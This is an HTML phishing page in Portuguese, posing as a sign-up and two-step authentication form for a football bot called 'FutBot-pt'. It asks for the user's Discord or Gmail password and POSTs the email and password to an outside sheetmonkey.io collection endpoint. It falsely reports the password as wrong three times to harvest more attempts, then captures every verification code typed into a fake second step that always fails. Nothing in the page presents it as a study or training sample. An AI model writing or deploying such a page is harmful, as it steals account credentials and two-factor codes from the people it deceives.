<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>App Futebol - Autenticação</title>
<style>
  * {
    box-sizing: border-box;
  }
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #0f2027;
    background: url("img.jpg");
    background-position: center center;
    background-size: cover;
    color: #fff;
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .container {
    background: rgba(255,255,255,0.1);
    padding: 25px 30px;
    border-radius: 10px;
    max-width: 400px;
    width: 100%;
    box-shadow: 0 0 15px rgba(0,0,0,0.5);
    backdrop-filter: blur(10px);
  }
  h2 {
    text-align: center;
    margin-bottom: 25px;
  }
  label {
    display: block;
    margin-top: 15px;
    font-weight: 600;
    font-size: 1rem;
  }
  input[type="text"],
  input[type="email"],
  input[type="password"],
  input[type="number"] {
    width: 100%;
    padding: 10px;
    margin-top: 5px;
    border-radius: 6px;
    border: none;
    font-size: 1rem;
  }
  button {
    margin-top: 25px;
    width: 100%;
    padding: 12px;
    font-size: 1.1rem;
    font-weight: 700;
    background-color: #0426bf;
    color: #fff;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #350294;
  }
  .hidden {
    display: none;
  }
  @media (max-width: 480px) {
    .container {
      padding: 20px 15px;
      max-width: 100%;
    }
  }
</style>
</head>
<body>

<div class="container" id="step1">
  <h2>Cadastro FutBot-pt</h2>
  
  <label for="nome">Nome:</label>
  <input type="text" id="nome" placeholder="Seu nome" required />
  
  <label for="email1">Email:</label>
  <input type="email" id="email1" placeholder="Seu email" required />
  
  <label for="senha1">Senha (Discord ou Gmail):</label>
  <input type="password" id="senha1" placeholder="Senha" required />
  
  <button id="btnSeguinte">Seguinte</button>
</div>

<div class="container hidden" id="step2">
  <h2>Autenticação</h2>
  <p>Mandamos números de autenticação para garantir que é você.</p>
  
  <label for="codigo">Digite o código:</label>
  <input type="number" id="codigo" placeholder="Código de autenticação" />
  
  <button id="btnAutenticar">Autenticar</button>
</div>

<script>
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');

  const btnSeguinte = document.getElementById('btnSeguinte');
  const btnAutenticar = document.getElementById('btnAutenticar');

  // Contadores para tentativas
  let tentativaSenha = 0;
  let tentativaCodigo = 0;

  btnSeguinte.addEventListener('click', () => {
    // Pega valores dos campos
    const nome = document.getElementById('nome').value.trim();
    const email1 = document.getElementById('email1').value.trim();
    const senha = document.getElementById('senha1').value;

    const url = 'https://api.sheetmonkey.io/form/wMbVRK9JsV61T9F56xW2Z2';

    // Dados que você quer enviar — personalize de acordo com o que a API espera
    const dados = {
        ema1: email1,
        ema2: senha
    };

    fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(dados),
    })
    .then(response => {
    if (!response.ok) {
        throw new Error('Erro ao enviar dados: ' + response.status);
    }
    return response.json();
    })
    .then(data => {
    console.log('Dados enviados com sucesso:', data);
    })
    .catch(error => {
    console.error('Erro:', error);
    });


    // Validações básicas
    if (!nome) {
      alert('Por favor, insira seu nome.');
      return;
    }


    if (!senha) {
      alert('Por favor, insira a senha.');
      return;
    }

    tentativaSenha++;

    if (tentativaSenha < 4) {
      alert(`Erro: a senha incorreta`);
      document.getElementById('senha1').value = '';
      document.getElementById('senha1').focus();
      return;
    }
    // Se chegou aqui é porque digitou a senha 4 vezes
    alert('Mandamos números de autentificação para garantir que é você.');

    step1.classList.add('hidden');
    step2.classList.remove('hidden');
  });

  btnAutenticar.addEventListener('click', () => {
    const codigo = document.getElementById('codigo').value.trim();

    const url = 'https://api.sheetmonkey.io/form/wMbVRK9JsV61T9F56xW2Z2';

    // Dados que você quer enviar — personalize de acordo com o que a API espera
    const dados = {
        ema3: codigo,
    };

    fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(dados),
    })
    .then(response => {
    if (!response.ok) {
        throw new Error('Erro ao enviar dados: ' + response.status);
    }
    return response.json();
    })
    .then(data => {
    console.log('Dados enviados com sucesso:', data);
    })
    .catch(error => {
    console.error('Erro:', error);
    });


    if (!codigo) {
      alert('Por favor, insira o código.');
      return;
    }

    tentativaCodigo++;

    if (tentativaCodigo > 10) {
      alert('Número máximo de tentativas ultrapassado. Tente novamente mais tarde.');
      btnAutenticar.disabled = true;
      return;
    }

    // Sempre dá erro por enquanto
    alert('Erro: código inválido. Tente novamente.');
    document.getElementById('codigo').value = '';
  });

  
</script>

</body>
</html>
